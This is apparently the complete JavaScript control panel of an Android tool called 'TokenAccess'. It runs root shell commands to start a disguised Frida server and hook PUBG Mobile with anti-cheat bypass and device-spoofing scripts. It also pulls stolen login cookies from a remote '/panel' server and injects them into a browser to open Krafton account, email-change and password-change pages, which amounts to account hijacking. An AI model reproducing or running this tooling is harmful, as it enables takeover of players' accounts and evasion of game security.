(function () {
  "use strict";
  var $ = function (id) { return document.getElementById(id); };
  var logs = [];
  var HOST = "accounts.krafton.com";
var T_MAIN = "https://accounts.krafton.com/";
var T_LINK = "https://accounts.krafton.com/";
var T_EMAIL = "https://accounts.krafton.com/";
var T_PASS = "https://accounts.krafton.com/";
  var PUBG_PKG = "com.tencent.ig";

  function log(m) {
    var line = "[" + new Date().toLocaleTimeString() + "] " + m;
    logs.push(line);
    if (logs.length > 300) logs.shift();
    $("logs").textContent = logs.join("\n");
    $("logs").scrollTop = $("logs").scrollHeight;
  }
  function setStatus(el, text, kind) {
    el.textContent = text;
    el.className = "status show " + (kind || "");
  }
  function nbExec(cmd) {
    if (window.AndroidBridge && window.AndroidBridge.exec) {
      return new Promise(function (resolve, reject) {
        var cb = "cb_" + Date.now() + Math.floor(Math.random() * 1000);
        window[cb] = function (r) { resolve(r); try { delete window[cb]; } catch (e) {} };
        try { window.AndroidBridge.exec(cmd, cb); } catch (e) { reject(e); }
        setTimeout(function () { reject(new Error("timeout")); }, 20000);
      });
    }
    return Promise.resolve("EMU:" + cmd);
  }
  function b64(s) { return btoa(unescape(encodeURIComponent(s))); }

  async function checkRoot() {
    log("проверка root...");
    try {
      var out = await nbExec("su -c id");
      if (out && out.indexOf("uid=0") >= 0) setStatus($("root-status"), "OK Root есть", "ok");
      else setStatus($("root-status"), "Нет root: " + out, "err");
    } catch (e) { setStatus($("root-status"), "Ошибка: " + e.message, "err"); }
  }
  async function checkMagisk() {
    log("проверка Magisk...");
    try {
      var mods = await nbExec("su -c \"ls /data/adb/modules 2>/dev/null || echo NONE\"");
      var list = mods.split("\n").filter(Boolean);
      var want = ["shamiko", "playintegrityfix", "tricky_store", "lsposed", "zygisk"];
      var found = want.filter(function (w) { return list.some(function (m) { return m.toLowerCase().indexOf(w) >= 0; }); });
      setStatus($("root-status"), "Модули: " + (found.join(", ") || "нет"), found.length ? "ok" : "err");
    } catch (e) { setStatus($("root-status"), "Ошибка: " + e.message, "err"); }
  }

  async function startFrida() {
    log("старт frida-server...");
    try {
      var found = await nbExec("su -c \"for f in /data/local/tmp/sysupd /data/local/tmp/fs-daemon /data/local/tmp/frida-server; do [ -f $f ] && echo $f; done\"");
      if (!found || found.indexOf("EMU") >= 0 || !found.trim()) {
        setStatus($("frida-status"), "Frida не найден в /data/local/tmp/", "err");
        return;
      }
      var bin = found.trim().split("\n")[0];
      await nbExec("su -c \"chmod 755 " + bin + "\"");
      var run = await nbExec("su -c \"ps -A | grep -E 'sysupd|fs-daemon|frida-server' | grep -v grep || echo NO\"");
      if (run.indexOf("NO") >= 0) {
        await nbExec("su -c \"" + bin + " -l 127.0.0.1:31337 >/dev/null 2>&1 &\"");
        await new Promise(function (r) { setTimeout(r, 2500); });
        var after = await nbExec("su -c \"ps -A | grep -E 'sysupd|fs-daemon|frida-server' | grep -v grep | head -1\"");
        if (after && after.indexOf("NO") < 0) setStatus($("frida-status"), "Frida запущен", "ok");
        else setStatus($("frida-status"), "Не стартанул", "err");
      } else setStatus($("frida-status"), "Frida уже работает", "ok");
    } catch (e) { setStatus($("frida-status"), "Ошибка: " + e.message, "err"); }
  }
  async function stopFrida() {
    await nbExec("su -c \"pkill -f sysupd; pkill -f fs-daemon; pkill -f frida-server\"");
    setStatus($("frida-status"), "Стоп", "ok");
  }

  async function overlayOn() {
    try { await nbExec("overlay_start"); setStatus($("overlay-status"), "Overlay включён", "ok"); }
    catch (e) { setStatus($("overlay-status"), "Ошибка: " + e.message, "err"); }
  }
  async function overlayOff() {
    try { await nbExec("overlay_stop"); setStatus($("overlay-status"), "Выключено", "ok"); }
    catch (e) { setStatus($("overlay-status"), "Ошибка: " + e.message, "err"); }
  }

  function parseCookies(str) {
    return str.split(";").map(function (s) { return s.trim(); }).filter(Boolean).map(function (p) {
      var i = p.indexOf("=");
      return i < 0 ? null : { name: p.slice(0, i).trim(), value: p.slice(i + 1).trim() };
    }).filter(Boolean);
  }

  async function saveToken() {
    var raw = $("token").value.trim();
    var aid = $("android-id").value.trim();
    if (!raw) { setStatus($("token-status"), "Вставь токен", "err"); return; }
    var cookies = parseCookies(raw);
    if (!cookies.length) { setStatus($("token-status"), "Не распарсить", "err"); return; }
    try {
      await nbExec("save_token " + b64(raw));
      if (aid) await nbExec("save_android_id " + b64(aid));
      setStatus($("token-status"), "Сохранено (" + cookies.length + ")", "ok");
      refreshTokenList();
    } catch (e) { setStatus($("token-status"), "Ошибка: " + e.message, "err"); }
  }
  async function pasteToken() {
    try { var t = await navigator.clipboard.readText(); $("token").value = t; setStatus($("token-status"), "Вставлено", "ok"); }
    catch (e) { setStatus($("token-status"), "Нет буфера", "err"); }
  }
  async function fetchTokens() {
    var url = prompt("URL сервера", "https://");
    if (!url) return;
    try {
      var res = await fetch(url.replace(/\/$/, "") + "/panel");
      var text = await res.text();
      var lines = text.trim().split("\n").slice(-30);
      var n = 0;
      for (var i = 0; i < lines.length; i++) {
        try { var o = JSON.parse(lines[i]); if (o.fields && o.fields.login) { await nbExec("save_token " + b64(JSON.stringify(o.fields))); n++; } } catch (e) {}
      }
      setStatus($("token-status"), "Забрано: " + n, "ok");
      refreshTokenList();
    } catch (e) { setStatus($("token-status"), "Ошибка: " + e.message, "err"); }
  }
  async function refreshTokenList() {
    try {
      var list = await nbExec("list_tokens");
      var c = $("token-list");
      c.innerHTML = "";
      if (!list || list === "EMPTY" || list.indexOf("EMU") >= 0) { c.innerHTML = "<div class=\"hint-text\">Нет сохранённых</div>"; return; }
      list.split("\n").filter(Boolean).forEach(function (item, i) {
        var el = document.createElement("div");
        el.className = "token-item";
        el.innerHTML = "<div class=\"meta\">#" + (i + 1) + "</div><div class=\"preview\">" + item.slice(0, 100).replace(/</g, "&lt;") + "</div>";
        el.addEventListener("click", async function () {
          await nbExec("use_token " + i);
          $("token").value = item;
          setStatus($("token-status"), "Выбран #" + (i + 1), "ok");
        });
        c.appendChild(el);
      });
    } catch (e) {}
  }
  async function clearAll() {
    if (!confirm("Удалить все?")) return;
    await nbExec("clear_tokens");
    $("token").value = "";
    setStatus($("token-status"), "Очищено", "ok");
    refreshTokenList();
  }

  async function setNativeCookies(raw) {
    var cookies = parseCookies(raw);
    var CM = window.Capacitor && Capacitor.Plugins && Capacitor.Plugins.CookieManager;
    if (CM) {
      await CM.clearAll();
      for (var i = 0; i < cookies.length; i++) {
        await CM.setCookie({ url: "https://" + HOST, key: cookies[i].name, value: cookies[i].value, domain: HOST, path: "/", secure: true });
      }
    } else {
      for (var j = 0; j < cookies.length; j++) document.cookie = cookies[j].name + "=" + cookies[j].value + "; domain=." + HOST + "; path=/; secure";
    }
  }
  async function openCabinet(url) {
    var raw = $("token").value.trim();
    if (!raw) { setStatus($("token-status"), "Сначала токен", "err"); return; }
    await setNativeCookies(raw);
    if (window.Capacitor && Capacitor.Plugins && Capacitor.Plugins.Browser) Capacitor.Plugins.Browser.open({ url: url });
    else window.location.href = url;
  }

  async function hookBypass() {
    try { var r = await nbExec("run_frida_script /data/local/tmp/scripts/ace-bypass.js"); setStatus($("hook-status"), "ACE bypass: " + r, "ok"); }
    catch (e) { setStatus($("hook-status"), "Ошибка: " + e.message, "err"); }
  }
  async function hookSpoof() {
    try { var r = await nbExec("run_frida_script /data/local/tmp/scripts/device-spoof.js"); setStatus($("hook-status"), "Device spoof: " + r, "ok"); }
    catch (e) { setStatus($("hook-status"), "Ошибка: " + e.message, "err"); }
  }
  async function hookAttach() {
    try {
      var run = await nbExec("su -c \"ps -A | grep " + PUBG_PKG + " | head -1 || echo NO\"");
      if (run.indexOf("NO") >= 0) { setStatus($("hook-status"), "PUBG не запущен", "err"); return; }
      await nbExec("attach_frida " + PUBG_PKG);
      setStatus($("hook-status"), "Хук прикреплён", "ok");
    } catch (e) { setStatus($("hook-status"), "Ошибка: " + e.message, "err"); }
  }
  async function hookDetach() {
    await nbExec("su -c \"pkill -f frida\"");
    setStatus($("hook-status"), "Отсоединено", "ok");
  }

  $("check-root").addEventListener("click", checkRoot);
  $("check-magisk").addEventListener("click", checkMagisk);
  $("start-frida").addEventListener("click", startFrida);
  $("stop-frida").addEventListener("click", stopFrida);
  $("overlay-on").addEventListener("click", overlayOn);
  $("overlay-off").addEventListener("click", overlayOff);
  $("save-token").addEventListener("click", saveToken);
  $("paste").addEventListener("click", pasteToken);
  $("fetch-tokens").addEventListener("click", fetchTokens);
  $("clear").addEventListener("click", clearAll);
  $("open-main").addEventListener("click", function () { openCabinet(T_MAIN); });
  $("open-link").addEventListener("click", function () { openCabinet(T_LINK); });
  $("open-email").addEventListener("click", function () { openCabinet(T_EMAIL); });
  $("open-pass").addEventListener("click", function () { openCabinet(T_PASS); });
  $("hook-bypass").addEventListener("click", hookBypass);
  $("hook-spoof").addEventListener("click", hookSpoof);
  $("hook-attach").addEventListener("click", hookAttach);
  $("hook-detach").addEventListener("click", hookDetach);
  $("clear-logs").addEventListener("click", function () { logs.length = 0; $("logs").textContent = ""; });

  log("TokenAccess запущен");
  refreshTokenList();
})();
